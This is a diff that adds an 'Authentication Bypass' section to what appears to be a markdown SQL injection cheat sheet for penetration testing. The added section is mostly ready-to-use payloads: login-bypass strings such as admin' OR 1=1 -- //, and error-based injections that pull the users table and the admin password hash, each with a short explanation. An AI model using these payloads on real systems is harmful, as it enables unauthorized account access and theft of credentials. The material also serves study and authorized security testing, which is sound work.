@@ -37,6 +37,43 @@ Here are some quick methods to detect the SQL Injection vulnerability, though th
   2. Submit SQL specific query.
   3. Submit Boolean conditions such as or 1=1 and or 1=0, and looking application's response.
   4. Submit certain payloads that results in time delay.
+
+## Authentication Bypass
+```
+Login Bypass - Testing for SQLi Authentication Bypass
+In some cases, SQL injection can lead to authentication bypass.
+By forcing the closing quote on the username value and adding an OR =1=1 statement followed by a -- comment separator and two forward slashes (//), we can prematurely terminate the SQL statement. 
+admin' OR 1=1 -- //
+    
+Since we have appended an OR statement that will always be true, the WHERE clause will return the first user id present in the database, whether or not the user record is present. 
+Because no other checks are implemented in the application, we are able to gain administrator privileges by circumventing the authentication logic.    
+
+Error-based payload
+' or 1=1 in (select @@version) -- //
+
+Attempting to retrieve the Users table
+' OR 1=1 in (SELECT * FROM users) -- //
+
+We should only query one column at a time, try to grab only the password column from the users table:
+' or 1=1 in (SELECT password FROM users) -- //
+
+This is somewhat helpful, as we managed to retrieve all user password hashes; however, we don't know which user each password hash corresponds to. 
+We can solve the issue by adding a WHERE clause specifying which user's password we want to retrieve, in this case admin.
+Improving our SQLi error-based payload:
+' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
+    
+Login Bypass:
+Both user and password or specific username and payload as password
+
+' or 1=1 --
+' or '1'='1
+' or 1=1 --+
+user' or 1=1;#
+user' or 1=1 LIMIT 1;#
+user' or 1=1 LIMIT 0,1;#    
+```
+
+
 ```
 # Post-Methods
 ## 1. Finding total number of columns with order by or group by or having :
